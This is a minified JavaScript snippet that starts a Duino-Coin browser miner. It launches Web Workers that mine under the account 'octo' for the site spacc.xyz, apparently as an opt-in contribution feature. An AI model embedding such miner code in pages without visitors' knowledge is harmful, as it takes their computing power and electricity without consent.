const userThreads=navigator.hardwareConcurrency;let username="octo",rigid="Duino-JS on spacc.xyz",threads=1;function startMiner(){threads<1&&(threads=1),threads>8&&(threads=8),threads>userThreads&&(threads=userThreads);for(let r=0;r<threads;r++)worker=new Worker("include/contributions/worker.min.js"),worker.postMessage([username,rigid])}